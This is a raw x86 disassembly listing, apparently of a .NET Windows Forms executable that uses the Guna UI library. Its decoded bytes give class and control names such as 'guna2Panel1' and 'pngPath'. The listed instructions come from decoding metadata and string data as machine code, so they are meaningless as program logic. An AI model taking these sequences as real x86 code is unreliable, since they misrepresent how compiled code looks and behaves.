  4047f3:	0d 06 00 c9 01       	or     $0x1c90006,%eax
  4047f8:	40                   	inc    %eax
  4047f9:	04 2d                	add    $0x2d,%al
  4047fb:	00 20                	add    %ah,(%eax)
  4047fd:	00 7b 00             	add    %bh,0x0(%ebx)
  404800:	c5 05 29 00 9b 00    	lds    0x9b0029,%eax
  404806:	07                   	pop    %es
  404807:	05 2e 00 0b 00       	add    $0xb002e,%eax
  40480c:	df 04 2e             	filds  (%esi,%ebp,1)
  40480f:	00 13                	add    %dl,(%ebx)
  404811:	00 e8                	add    %ch,%al
  404813:	04 2e                	add    $0x2e,%al
  404815:	00 1b                	add    %bl,(%ebx)
  404817:	00 07                	add    %al,(%edi)
  404819:	05 2e 00 23 00       	add    $0x23002e,%eax
  40481e:	10 05 2e 00 2b 00    	adc    %al,0x2b002e
  404824:	26 05 2e 00 33 00    	es add $0x33002e,%eax
  40482a:	26 05 2e 00 3b 00    	es add $0x3b002e,%eax
  404830:	26 05 2e 00 43 00    	es add $0x43002e,%eax
  404836:	10 05 2e 00 4b 00    	adc    %al,0x4b002e
  40483c:	2c 05                	sub    $0x5,%al
  40483e:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  404842:	26 05 2e 00 5b 00    	es add $0x5b002e,%eax
  404848:	26 05 2e 00 63 00    	es add $0x63002e,%eax
  40484e:	44                   	inc    %esp
  40484f:	05 2e 00 6b 00       	add    $0x6b002e,%eax
  404854:	6e                   	outsb  %ds:(%esi),(%dx)
  404855:	05 2e 00 73 00       	add    $0x73002e,%eax
  40485a:	7b 05                	jnp    0x404861
  40485c:	49                   	dec    %ecx
  40485d:	00 9b 00 07 05 63    	add    %bl,0x63050700(%ebx)
  404863:	00 83 00 8a 07 63    	add    %al,0x63078a00(%ebx)
  404869:	00 8b 00 c5 05 63    	add    %cl,0x6305c500(%ebx)
  40486f:	00 93 00 c5 05 83    	add    %dl,-0x7cfa3b00(%ebx)
  404875:	00 93 00 c5 05 83    	add    %dl,-0x7cfa3b00(%ebx)
  40487b:	00 83 00 cb 07 c3    	add    %al,-0x3cf83500(%ebx)
  404881:	00 93 00 c5 05 e3    	add    %dl,-0x1cfa3b00(%ebx)
  404887:	00 93 00 c5 05 03    	add    %dl,0x305c500(%ebx)
  40488d:	01 93 00 c5 05 23    	add    %edx,0x2305c500(%ebx)
  404893:	01 93 00 c5 05 40    	add    %edx,0x4005c500(%ebx)
  404899:	01 a3 00 ca 05 43    	add    %esp,0x4305ca00(%ebx)
  40489f:	01 93 00 c5 05 60    	add    %edx,0x6005c500(%ebx)
  4048a5:	01 a3 00 ec 05 63    	add    %esp,0x6305ec00(%ebx)
  4048ab:	01 93 00 c5 05 80    	add    %edx,-0x7ffa3b00(%ebx)
  4048b1:	01 a3 00 0e 06 83    	add    %esp,-0x7cf9f200(%ebx)
  4048b7:	01 93 00 c5 05 a0    	add    %edx,-0x5ffa3b00(%ebx)
  4048bd:	01 a3 00 30 06 a3    	add    %esp,-0x5cf9d000(%ebx)
  4048c3:	01 93 00 c5 05 c0    	add    %edx,-0x3ffa3b00(%ebx)
  4048c9:	01 a3 00 52 06 c3    	add    %esp,-0x3cf9ae00(%ebx)
  4048cf:	01 93 00 c5 05 e0    	add    %edx,-0x1ffa3b00(%ebx)
  4048d5:	01 a3 00 74 06 e3    	add    %esp,-0x1cf98c00(%ebx)
  4048db:	01 93 00 c5 05 00    	add    %edx,0x5c500(%ebx)
  4048e1:	02 a3 00 a3 06 03    	add    0x306a300(%ebx),%ah
  4048e7:	02 93 00 c5 05 20    	add    0x2005c500(%ebx),%dl
  4048ed:	02 a3 00 c5 06 23    	add    0x2306c500(%ebx),%ah
  4048f3:	02 93 00 c5 05 40    	add    0x4005c500(%ebx),%dl
  4048f9:	02 a3 00 f4 06 43    	add    0x4306f400(%ebx),%ah
  4048ff:	02 93 00 c5 05 63    	add    0x6305c500(%ebx),%dl
  404905:	02 93 00 c5 05 83    	add    -0x7cfa3b00(%ebx),%dl
  40490b:	02 93 00 c5 05 a0    	add    -0x5ffa3b00(%ebx),%dl
  404911:	02 93 00 c5 05 c0    	add    -0x3ffa3b00(%ebx),%dl
  404917:	03 a3 00 16 07 00    	add    0x71600(%ebx),%esp
  40491d:	04 a3                	add    $0xa3,%al
  40491f:	00 50 07             	add    %dl,0x7(%eax)
  404922:	80 04 bb 00          	addb   $0x0,(%ebx,%edi,4)
  404926:	c5 05 c0 04 bb 00    	lds    0xbb04c0,%eax
  40492c:	c5 05 00 05 bb 00    	lds    0xbb0500,%eax
  404932:	c5 05 40 05 bb 00    	lds    0xbb0540,%eax
  404938:	c5 05 80 05 bb 00    	lds    0xbb0580,%eax
  40493e:	c5 05 c0 05 bb 00    	lds    0xbb05c0,%eax
  404944:	c5 05 00 06 bb 00    	lds    0xbb0600,%eax
  40494a:	c5 05 40 06 bb 00    	lds    0xbb0640,%eax
  404950:	c5 05 80 06 bb 00    	lds    0xbb0680,%eax
  404956:	c5 05 c0 06 bb 00    	lds    0xbb06c0,%eax
  40495c:	c5 05 00 07 bb 00    	lds    0xbb0700,%eax
  404962:	c5 05 63 00 91 00    	lds    0x910063,%eax
  404968:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404969:	00 b1 00 bb 00 cc    	add    %dh,-0x33ff4500(%ecx)
  40496f:	00 dc                	add    %bl,%ah
  404971:	00 e6                	add    %ah,%dh
  404973:	00 f0                	add    %dh,%al
  404975:	00 a9 01 d4 01 20    	add    %ch,0x2001d401(%ecx)
  40497b:	02 2a                	add    (%edx),%ch
  40497d:	02 39                	add    (%ecx),%bh
  40497f:	02 ab 02 d5 02 07    	add    0x702d502(%ebx),%ch
  404985:	03 67 03             	add    0x3(%edi),%esp
  404988:	79 03                	jns    0x40498d
  40498a:	ad                   	lods   %ds:(%esi),%eax
  40498b:	03 c1                	add    %ecx,%eax
  40498d:	03 03                	add    (%ebx),%eax
  40498f:	00 01                	add    %al,(%ecx)
  404991:	00 04 00             	add    %al,(%eax,%eax,1)
  404994:	03 00                	add    (%eax),%eax
  404996:	00 00                	add    %al,(%eax)
  404998:	7b 0a                	jnp    0x4049a4
  40499a:	d0 04 00             	rolb   $1,(%eax,%eax,1)
  40499d:	00 a2 04 d5 04 00    	add    %ah,0x4d504(%edx)
  4049a3:	00 7d 0d             	add    %bh,0xd(%ebp)
  4049a6:	da 04 02             	fiaddl (%edx,%eax,1)
  4049a9:	00 03                	add    %al,(%ebx)
  4049ab:	00 03                	add    %al,(%ebx)
  4049ad:	00 02                	add    %al,(%edx)
  4049af:	00 04 00             	add    %al,(%eax,%eax,1)
  4049b2:	05 00 01 00 05       	add    $0x5000100,%eax
  4049b7:	00 05 00 02 00 06    	add    %al,0x6000200
  4049bd:	00 07                	add    %al,(%edi)
  4049bf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4049c2:	46                   	inc    %esi
  4049c3:	00 2b                	add    %ch,(%ebx)
  4049c5:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4049c8:	48                   	dec    %eax
  4049c9:	00 2d 00 0d 00 4a    	add    %ch,0x4a000d00
  4049cf:	00 2b                	add    %ch,(%ebx)
  4049d1:	00 0d 00 4c 00 2d    	add    %cl,0x2d004c00
  4049d7:	00 0e                	add    %cl,(%esi)
  4049d9:	00 4e 00             	add    %cl,0x0(%esi)
  4049dc:	2b 00                	sub    (%eax),%eax
  4049de:	0e                   	push   %cs
  4049df:	00 50 00             	add    %dl,0x0(%eax)
  4049e2:	2d 00 0f 00 52       	sub    $0x52000f00,%eax
  4049e7:	00 2b                	add    %ch,(%ebx)
  4049e9:	00 0f                	add    %cl,(%edi)
  4049eb:	00 54 00 2d          	add    %dl,0x2d(%eax,%eax,1)
  4049ef:	00 10                	add    %dl,(%eax)
  4049f1:	00 56 00             	add    %dl,0x0(%esi)
  4049f4:	2b 00                	sub    (%eax),%eax
  4049f6:	10 00                	adc    %al,(%eax)
  4049f8:	58                   	pop    %eax
  4049f9:	00 2d 00 11 00 5a    	add    %ch,0x5a001100
  4049ff:	00 2b                	add    %ch,(%ebx)
  404a01:	00 11                	add    %dl,(%ecx)
  404a03:	00 5c 00 2d          	add    %bl,0x2d(%eax,%eax,1)
  404a07:	00 12                	add    %dl,(%edx)
  404a09:	00 5e 00             	add    %bl,0x0(%esi)
  404a0c:	2b 00                	sub    (%eax),%eax
  404a0e:	12 00                	adc    (%eax),%al
  404a10:	60                   	pusha
  404a11:	00 2d 00 13 00 62    	add    %ch,0x62001300
  404a17:	00 2b                	add    %ch,(%ebx)
  404a19:	00 13                	add    %dl,(%ebx)
  404a1b:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  404a1f:	00 14 00             	add    %dl,(%eax,%eax,1)
  404a22:	66 00 2b             	data16 add %ch,(%ebx)
  404a25:	00 14 00             	add    %dl,(%eax,%eax,1)
  404a28:	68 00 2d 00 15       	push   $0x15002d00
  404a2d:	00 6a 00             	add    %ch,0x0(%edx)
  404a30:	2b 00                	sub    (%eax),%eax
  404a32:	15 00 6c 00 2d       	adc    $0x2d006c00,%eax
  404a37:	00 16                	add    %dl,(%esi)
  404a39:	00 6e 00             	add    %ch,0x0(%esi)
  404a3c:	2b 00                	sub    (%eax),%eax
  404a3e:	16                   	push   %ss
  404a3f:	00 70 00             	add    %dh,0x0(%eax)
  404a42:	2d 00 68 00 c0       	sub    $0xc0006800,%eax
  404a47:	00 49 02             	add    %cl,0x2(%ecx)
  404a4a:	68 02 7a 02 b7       	push   $0xb7027a02
  404a4f:	02 e3                	add    %bl,%ah
  404a51:	02 ee                	add    %dh,%ch
  404a53:	02 f5                	add    %ch,%dh
  404a55:	02 04 80             	add    (%eax,%eax,4),%al
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	01 00                	add    %eax,(%eax)
	...
  404a68:	db 02                	fildl  (%edx)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	04 00                	add    $0x0,%al
	...
  404a76:	00 00                	add    %al,(%eax)
  404a78:	d5 03                	aad    $0x3
  404a7a:	f8                   	clc
  404a7b:	02 00                	add    (%eax),%al
  404a7d:	00 00                	add    %al,(%eax)
  404a7f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	d5 03                	aad    $0x3
  404a8e:	d7                   	xlat   %ds:(%ebx)
  404a8f:	08 00                	or     %al,(%eax)
  404a91:	00 00                	add    %al,(%eax)
  404a93:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  404a9e:	00 00                	add    %al,(%eax)
  404aa0:	d5 03                	aad    $0x3
  404aa2:	91                   	xchg   %eax,%ecx
  404aa3:	0c 00                	or     $0x0,%al
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	00 02                	add    %al,(%edx)
  404aa9:	00 00                	add    %al,(%eax)
  404aab:	00 04 00             	add    %al,(%eax,%eax,1)
  404aae:	07                   	pop    %es
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	00 00                	add    %al,(%eax)
  404ab3:	00 de                	add    %bl,%dh
  404ab5:	03 c4                	add    %esp,%eax
  404ab7:	01 00                	add    %eax,(%eax)
  404ab9:	00 00                	add    %al,(%eax)
  404abb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  404ac6:	00 00                	add    %al,(%eax)
  404ac8:	e7 03                	out    %eax,$0x3
  404aca:	e7 07                	out    %eax,$0x7
	...
  404ad4:	01 00                	add    %eax,(%eax)
  404ad6:	00 00                	add    %al,(%eax)
  404ad8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ad9:	0b 00                	or     (%eax),%eax
  404adb:	00 b8 00 00 00 01    	add    %bh,0x1000000(%eax)
  404ae1:	00 00                	add    %al,(%eax)
  404ae3:	00 bf 0b 00 00 06    	add    %bh,0x600000b(%edi)
  404ae9:	00 05 00 07 00 05    	add    %al,0x5000700
  404aef:	00 08                	add    %cl,(%eax)
  404af1:	00 05 00 09 00 05    	add    %al,0x5000900
  404af7:	00 0a                	add    %cl,(%edx)
  404af9:	00 05 00 0b 00 05    	add    %al,0x5000b00
  404aff:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404b02:	05 00 0d 00 05       	add    $0x5000d00,%eax
  404b07:	00 0e                	add    %cl,(%esi)
  404b09:	00 05 00 0f 00 05    	add    %al,0x5000f00
  404b0f:	00 10                	add    %dl,(%eax)
  404b11:	00 05 00 11 00 05    	add    %al,0x5001100
  404b17:	00 12                	add    %dl,(%edx)
  404b19:	00 05 00 13 00 05    	add    %al,0x5001300
  404b1f:	00 14 00             	add    %dl,(%eax,%eax,1)
  404b22:	05 00 15 00 09       	add    $0x9001500,%eax
  404b27:	00 16                	add    %dl,(%esi)
  404b29:	00 0a                	add    %cl,(%edx)
  404b2b:	00 47 00             	add    %al,0x0(%edi)
  404b2e:	82 00 4d             	addb   $0x4d,(%eax)
  404b31:	00 9c 00 4d 00 ac 00 	add    %bl,0xac004d(%eax,%eax,1)
  404b38:	4d                   	dec    %ebp
  404b39:	00 b6 00 53 00 c7    	add    %dh,-0x38ffad00(%esi)
  404b3f:	00 59 00             	add    %bl,0x0(%ecx)
  404b42:	d7                   	xlat   %ds:(%ebx)
  404b43:	00 4d 00             	add    %cl,0x0(%ebp)
  404b46:	e1 00                	loope  0x404b48
  404b48:	59                   	pop    %ecx
  404b49:	00 eb                	add    %ch,%bl
  404b4b:	00 4d 00             	add    %cl,0x0(%ebp)
  404b4e:	f5                   	cmc
  404b4f:	00 4d 00             	add    %cl,0x0(%ebp)
  404b52:	25 02 4d 00 2f       	and    $0x2f004d02,%eax
  404b57:	02 05 01 63 02 0b    	add    0xb026301,%al
  404b5d:	01 8d 02 1b 01 c6    	add    %ecx,-0x39fee4fe(%ebp)
  404b63:	02 05 01 ea 02 31    	add    0x3102ea01,%al
  404b69:	01 fc                	add    %edi,%esp
  404b6b:	02 1b                	add    (%ebx),%bl
  404b6d:	01 26                	add    %esp,(%esi)
  404b6f:	03 1b                	add    (%ebx),%ebx
  404b71:	01 3f                	add    %edi,(%edi)
  404b73:	03 1b                	add    (%ebx),%ebx
  404b75:	01 4a 03             	add    %ecx,0x3(%edx)
  404b78:	1b 01                	sbb    (%ecx),%eax
  404b7a:	5f                   	pop    %edi
  404b7b:	03 1b                	add    (%ebx),%ebx
  404b7d:	01 71 03             	add    %esi,0x3(%ecx)
  404b80:	1b 01                	sbb    (%ecx),%eax
  404b82:	87 03                	xchg   %eax,(%ebx)
  404b84:	45                   	inc    %ebp
  404b85:	01 9d 03 45 01 a5    	add    %ebx,-0x5afebafd(%ebp)
  404b8b:	03 1b                	add    (%ebx),%ebx
  404b8d:	01 b9 03 1b 01 cd    	add    %edi,-0x32fee4fd(%ecx)
  404b93:	03 00                	add    (%eax),%eax
  404b95:	00 00                	add    %al,(%eax)
  404b97:	00 00                	add    %al,(%eax)
  404b99:	3c 3e                	cmp    $0x3e,%al
  404b9b:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  404b9e:	44                   	inc    %esp
  404b9f:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404ba6:	6c                   	insb   (%dx),%es:(%edi)
  404ba7:	61                   	popa
  404ba8:	73 73                	jae    0x404c1d
  404baa:	31 5f 30             	xor    %ebx,0x30(%edi)
  404bad:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  404bb0:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  404bb3:	44                   	inc    %esp
  404bb4:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404bbb:	6c                   	insb   (%dx),%es:(%edi)
  404bbc:	61                   	popa
  404bbd:	73 73                	jae    0x404c32
  404bbf:	32 5f 30             	xor    0x30(%edi),%bl
  404bc2:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  404bc5:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  404bc8:	44                   	inc    %esp
  404bc9:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404bd0:	6c                   	insb   (%dx),%es:(%edi)
  404bd1:	61                   	popa
  404bd2:	73 73                	jae    0x404c47
  404bd4:	33 5f 30             	xor    0x30(%edi),%ebx
  404bd7:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  404bda:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  404bdd:	44                   	inc    %esp
  404bde:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404be5:	6c                   	insb   (%dx),%es:(%edi)
  404be6:	61                   	popa
  404be7:	73 73                	jae    0x404c5c
  404be9:	34 5f                	xor    $0x5f,%al
  404beb:	30 00                	xor    %al,(%eax)
  404bed:	3c 3e                	cmp    $0x3e,%al
  404bef:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  404bf2:	44                   	inc    %esp
  404bf3:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  404bfa:	6c                   	insb   (%dx),%es:(%edi)
  404bfb:	61                   	popa
  404bfc:	73 73                	jae    0x404c71
  404bfe:	35 5f 30 00 3c       	xor    $0x3c00305f,%eax
  404c03:	52                   	push   %edx
  404c04:	55                   	push   %ebp
  404c05:	30 30                	xor    %dh,(%eax)
  404c07:	35 3e 62 5f 5f       	xor    $0x5f5f623e,%eax
  404c0c:	39 5f 30             	cmp    %ebx,0x30(%edi)
  404c0f:	00 3c 55 53 30 30 31 	add    %bh,0x31303053(,%edx,2)
  404c16:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  404c1a:	30 00                	xor    %al,(%eax)
  404c1c:	3c 52                	cmp    $0x52,%al
  404c1e:	55                   	push   %ebp
  404c1f:	30 30                	xor    %dh,(%eax)
  404c21:	31 3e                	xor    %edi,(%esi)
  404c23:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404c26:	30 00                	xor    %al,(%eax)
  404c28:	3c 55                	cmp    $0x55,%al
  404c2a:	53                   	push   %ebx
  404c2b:	30 30                	xor    %dh,(%eax)
  404c2d:	32 3e                	xor    (%esi),%bh
  404c2f:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404c32:	30 00                	xor    %al,(%eax)
  404c34:	3c 52                	cmp    $0x52,%al
  404c36:	55                   	push   %ebp
  404c37:	30 30                	xor    %dh,(%eax)
  404c39:	32 3e                	xor    (%esi),%bh
  404c3b:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404c3e:	30 00                	xor    %al,(%eax)
  404c40:	3c 52                	cmp    $0x52,%al
  404c42:	55                   	push   %ebp
  404c43:	30 30                	xor    %dh,(%eax)
  404c45:	33 3e                	xor    (%esi),%edi
  404c47:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404c4a:	30 00                	xor    %al,(%eax)
  404c4c:	55                   	push   %ebp
  404c4d:	53                   	push   %ebx
  404c4e:	30 30                	xor    %dh,(%eax)
  404c50:	31 00                	xor    %eax,(%eax)
  404c52:	52                   	push   %edx
  404c53:	55                   	push   %ebp
  404c54:	30 30                	xor    %dh,(%eax)
  404c56:	31 00                	xor    %eax,(%eax)
  404c58:	3c 3e                	cmp    $0x3e,%al
  404c5a:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  404c5d:	39 5f 31             	cmp    %ebx,0x31(%edi)
  404c60:	00 3c 52             	add    %bh,(%edx,%edx,2)
  404c63:	55                   	push   %ebp
  404c64:	30 30                	xor    %dh,(%eax)
  404c66:	35 3e 62 5f 5f       	xor    $0x5f5f623e,%eax
  404c6b:	39 5f 31             	cmp    %ebx,0x31(%edi)
  404c6e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  404c71:	38 5f 5f             	cmp    %bl,0x5f(%edi)
  404c74:	31 00                	xor    %eax,(%eax)
  404c76:	3c 52                	cmp    $0x52,%al
  404c78:	55                   	push   %ebp
  404c79:	30 30                	xor    %dh,(%eax)
  404c7b:	31 3e                	xor    %edi,(%esi)
  404c7d:	64 5f                	fs pop %edi
  404c7f:	5f                   	pop    %edi
  404c80:	31 00                	xor    %eax,(%eax)
  404c82:	3c 3e                	cmp    $0x3e,%al
  404c84:	75 5f                	jne    0x404ce5
  404c86:	5f                   	pop    %edi
  404c87:	31 00                	xor    %eax,(%eax)
  404c89:	46                   	inc    %esi
  404c8a:	75 6e                	jne    0x404cfa
  404c8c:	63 60 31             	arpl   %esp,0x31(%eax)
  404c8f:	00 54 61 73          	add    %dl,0x73(%ecx,%eiz,2)
  404c93:	6b 60 31 00          	imul   $0x0,0x31(%eax),%esp
  404c97:	41                   	inc    %ecx
  404c98:	73 79                	jae    0x404d13
  404c9a:	6e                   	outsb  %ds:(%esi),(%dx)
  404c9b:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  404c9f:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  404ca3:	68 6f 64 42 75       	push   $0x7542646f
  404ca8:	69 6c 64 65 72 60 31 	imul   $0x316072,0x65(%esp,%eiz,2),%ebp
  404caf:	00 
  404cb0:	54                   	push   %esp
  404cb1:	61                   	popa
  404cb2:	73 6b                	jae    0x404d1f
  404cb4:	41                   	inc    %ecx
  404cb5:	77 61                	ja     0x404d18
  404cb7:	69 74 65 72 60 31 00 	imul   $0x67003160,0x72(%ebp,%eiz,2),%esi
  404cbe:	67 
  404cbf:	75 6e                	jne    0x404d2f
  404cc1:	61                   	popa
  404cc2:	32 48 74             	xor    0x74(%eax),%cl
  404cc5:	6d                   	insl   (%dx),%es:(%edi)
  404cc6:	6c                   	insb   (%dx),%es:(%edi)
  404cc7:	4c                   	dec    %esp
  404cc8:	61                   	popa
  404cc9:	62 65 6c             	bound  %esp,0x6c(%ebp)
  404ccc:	31 00                	xor    %eax,(%eax)
  404cce:	67 75 6e             	addr16 jne 0x404d3f
  404cd1:	61                   	popa
  404cd2:	32 50 61             	xor    0x61(%eax),%dl
  404cd5:	6e                   	outsb  %ds:(%esi),(%dx)
  404cd6:	65 6c                	gs insb (%dx),%es:(%edi)
  404cd8:	31 00                	xor    %eax,(%eax)
  404cda:	67 75 6e             	addr16 jne 0x404d4b
  404cdd:	61                   	popa
  404cde:	32 44 72 61          	xor    0x61(%edx,%esi,2),%al
  404ce2:	67 43                	addr16 inc %ebx
  404ce4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ce5:	6e                   	outsb  %ds:(%esi),(%dx)
  404ce6:	74 72                	je     0x404d5a
  404ce8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ce9:	6c                   	insb   (%dx),%es:(%edi)
  404cea:	31 00                	xor    %eax,(%eax)
  404cec:	67 75 6e             	addr16 jne 0x404d5d
  404cef:	61                   	popa
  404cf0:	32 42 6f             	xor    0x6f(%edx),%al
  404cf3:	72 64                	jb     0x404d59
  404cf5:	65 72 6c             	gs jb  0x404d64
  404cf8:	65 73 73             	gs jae 0x404d6e
  404cfb:	46                   	inc    %esi
  404cfc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cfd:	72 6d                	jb     0x404d6c
  404cff:	31 00                	xor    %eax,(%eax)
  404d01:	3c 3e                	cmp    $0x3e,%al
  404d03:	37                   	aaa
  404d04:	5f                   	pop    %edi
  404d05:	5f                   	pop    %edi
  404d06:	77 72                	ja     0x404d7a
  404d08:	61                   	popa
  404d09:	70 31                	jo     0x404d3c
  404d0b:	00 57 69             	add    %dl,0x69(%edi)
  404d0e:	6e                   	outsb  %ds:(%esi),(%dx)
  404d0f:	64 6f                	outsl  %fs:(%esi),(%dx)
  404d11:	77 73                	ja     0x404d86
  404d13:	46                   	inc    %esi
  404d14:	6f                   	outsl  %ds:(%esi),(%dx)
  404d15:	72 6d                	jb     0x404d84
  404d17:	73 41                	jae    0x404d5a
  404d19:	70 70                	jo     0x404d8b
  404d1b:	31 00                	xor    %eax,(%eax)
  404d1d:	67 75 6e             	addr16 jne 0x404d8e
  404d20:	61                   	popa
  404d21:	32 50 72             	xor    0x72(%eax),%dl
  404d24:	6f                   	outsl  %ds:(%esi),(%dx)
  404d25:	67 72 65             	addr16 jb 0x404d8d
  404d28:	73 73                	jae    0x404d9d
  404d2a:	42                   	inc    %edx
  404d2b:	61                   	popa
  404d2c:	72 31                	jb     0x404d5f
  404d2e:	00 67 75             	add    %ah,0x75(%edi)
  404d31:	6e                   	outsb  %ds:(%esi),(%dx)
  404d32:	61                   	popa
  404d33:	32 53 65             	xor    0x65(%ebx),%dl
  404d36:	70 61                	jo     0x404d99
  404d38:	72 61                	jb     0x404d9b
  404d3a:	74 6f                	je     0x404dab
  404d3c:	72 31                	jb     0x404d6f
  404d3e:	00 67 75             	add    %ah,0x75(%edi)
  404d41:	6e                   	outsb  %ds:(%esi),(%dx)
  404d42:	61                   	popa
  404d43:	32 43 6f             	xor    0x6f(%ebx),%al
  404d46:	6e                   	outsb  %ds:(%esi),(%dx)
  404d47:	74 72                	je     0x404dbb
  404d49:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4a:	6c                   	insb   (%dx),%es:(%edi)
  404d4b:	42                   	inc    %edx
  404d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4d:	78 31                	js     0x404d80
  404d4f:	00 55 53             	add    %dl,0x53(%ebp)
  404d52:	30 30                	xor    %dh,(%eax)
  404d54:	32 00                	xor    (%eax),%al
  404d56:	52                   	push   %edx
  404d57:	55                   	push   %ebp
  404d58:	30 30                	xor    %dh,(%eax)
  404d5a:	32 00                	xor    (%eax),%al
  404d5c:	47                   	inc    %edi
  404d5d:	75 6e                	jne    0x404dcd
  404d5f:	61                   	popa
  404d60:	2e 55                	cs push %ebp
  404d62:	49                   	dec    %ecx
  404d63:	32 00                	xor    (%eax),%al
  404d65:	3c 69                	cmp    $0x69,%al
  404d67:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  404d6d:	3c 55                	cmp    $0x55,%al
  404d6f:	53                   	push   %ebx
  404d70:	30 30                	xor    %dh,(%eax)
  404d72:	31 3e                	xor    %edi,(%esi)
  404d74:	64 5f                	fs pop %edi
  404d76:	5f                   	pop    %edi
  404d77:	32 00                	xor    (%eax),%al
  404d79:	3c 3e                	cmp    $0x3e,%al
  404d7b:	75 5f                	jne    0x404ddc
  404d7d:	5f                   	pop    %edi
  404d7e:	32 00                	xor    (%eax),%al
  404d80:	67 75 6e             	addr16 jne 0x404df1
  404d83:	61                   	popa
  404d84:	32 50 61             	xor    0x61(%eax),%dl
  404d87:	6e                   	outsb  %ds:(%esi),(%dx)
  404d88:	65 6c                	gs insb (%dx),%es:(%edi)
  404d8a:	32 00                	xor    (%eax),%al
  404d8c:	67 75 6e             	addr16 jne 0x404dfd
  404d8f:	61                   	popa
  404d90:	32 42 75             	xor    0x75(%edx),%al
  404d93:	74 74                	je     0x404e09
  404d95:	6f                   	outsl  %ds:(%esi),(%dx)
  404d96:	6e                   	outsb  %ds:(%esi),(%dx)
  404d97:	32 00                	xor    (%eax),%al
  404d99:	3c 3e                	cmp    $0x3e,%al
  404d9b:	37                   	aaa
  404d9c:	5f                   	pop    %edi
  404d9d:	5f                   	pop    %edi
  404d9e:	77 72                	ja     0x404e12
  404da0:	61                   	popa
  404da1:	70 32                	jo     0x404dd5
  404da3:	00 67 75             	add    %ah,0x75(%edi)
  404da6:	6e                   	outsb  %ds:(%esi),(%dx)
  404da7:	61                   	popa
  404da8:	32 43 6f             	xor    0x6f(%ebx),%al
  404dab:	6e                   	outsb  %ds:(%esi),(%dx)
  404dac:	74 72                	je     0x404e20
  404dae:	6f                   	outsl  %ds:(%esi),(%dx)
  404daf:	6c                   	insb   (%dx),%es:(%edi)
  404db0:	42                   	inc    %edx
  404db1:	6f                   	outsl  %ds:(%esi),(%dx)
  404db2:	78 32                	js     0x404de6
  404db4:	00 52 55             	add    %dl,0x55(%edx)
  404db7:	30 30                	xor    %dh,(%eax)
  404db9:	33 00                	xor    (%eax),%eax
  404dbb:	3c 52                	cmp    $0x52,%al
  404dbd:	55                   	push   %ebp
  404dbe:	30 30                	xor    %dh,(%eax)
  404dc0:	32 3e                	xor    (%esi),%bh
  404dc2:	64 5f                	fs pop %edi
  404dc4:	5f                   	pop    %edi
  404dc5:	33 00                	xor    (%eax),%eax
  404dc7:	3c 3e                	cmp    $0x3e,%al
  404dc9:	75 5f                	jne    0x404e2a
  404dcb:	5f                   	pop    %edi
  404dcc:	33 00                	xor    (%eax),%eax
  404dce:	52                   	push   %edx
  404dcf:	55                   	push   %ebp
  404dd0:	30 30                	xor    %dh,(%eax)
  404dd2:	34 00                	xor    $0x0,%al
  404dd4:	3c 70                	cmp    $0x70,%al
  404dd6:	6e                   	outsb  %ds:(%esi),(%dx)
  404dd7:	67 50                	addr16 push %eax
  404dd9:	61                   	popa
  404dda:	74 68                	je     0x404e44
  404ddc:	3e 35 5f 5f 34 00    	ds xor $0x345f5f,%eax
  404de2:	3c 55                	cmp    $0x55,%al
  404de4:	53                   	push   %ebx
  404de5:	30 30                	xor    %dh,(%eax)
  404de7:	32 3e                	xor    (%esi),%bh
  404de9:	64 5f                	fs pop %edi
  404deb:	5f                   	pop    %edi
  404dec:	34 00                	xor    $0x0,%al
  404dee:	52                   	push   %edx
  404def:	55                   	push   %ebp
  404df0:	30 30                	xor    %dh,(%eax)
  404df2:	35 00 3c 52 55       	xor    $0x55523c00,%eax
  404df7:	30 30                	xor    %dh,(%eax)
  404df9:	33 3e                	xor    (%esi),%edi
  404dfb:	64 5f                	fs pop %edi
  404dfd:	5f                   	pop    %edi
  404dfe:	35 00 3c 67 75       	xor    $0x75673c00,%eax
  404e03:	6e                   	outsb  %ds:(%esi),(%dx)
  404e04:	61                   	popa
  404e05:	32 42 75             	xor    0x75(%edx),%al
  404e08:	74 74                	je     0x404e7e
